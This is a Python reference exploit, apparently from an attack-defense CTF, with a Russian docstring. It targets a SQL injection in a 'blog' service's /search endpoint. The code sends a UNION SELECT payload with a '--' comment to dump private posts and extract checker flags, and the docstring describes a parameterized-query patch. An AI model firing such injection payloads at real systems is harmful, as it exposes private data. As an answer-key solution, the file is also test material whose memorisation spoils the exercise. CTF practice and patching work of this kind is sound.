"""ЭТАЛОН: blog — SQL-инъекция в /search.

Уязвимость: GET /search?q= собирает SQL конкатенацией строк:
    "SELECT id,title,body FROM posts WHERE private=0 AND title LIKE '%" + q + "%'"
Параметр q попадает в запрос без экранирования -> классическая SQL-инъекция.
Кавычкой закрываем строковый литерал, UNION'ом добавляем ВСЕ посты (в т.ч. private=1),
хвост запроса срезаем комментарием '--'. Так из публичного поиска вытекают чужие
приватные посты, среди которых лежат флаги чекера.

Патч (services/blog/app.py, search): параметризованный запрос, напр.:
    cur.execute("... AND title LIKE ?", ("%" + q + "%",))
и НЕ склеивать пользовательский ввод со строкой SQL. /search в SLA не участвует,
поэтому правильный патч SLA не ломает.
"""
import re
import requests

SERVICE = "blog"
FLAG = re.compile(r"[A-Z0-9]{31}=")


def exploit(host, port):
    base = f"http://{host}:{port}"
    # '%' закрывает исходный LIKE, UNION добавляет все посты, '--' комментирует хвост ("%'").
    payload = "' UNION SELECT id,title,body FROM posts-- "
    try:
        r = requests.get(f"{base}/search", params={"q": payload}, timeout=5)
    except requests.RequestException:
        return []
    flags = []
    for row in r.json().get("results", []):
        flags += FLAG.findall(str(row.get("body", "")))
    # уникализируем, сохраняя порядок
    return list(dict.fromkeys(flags))
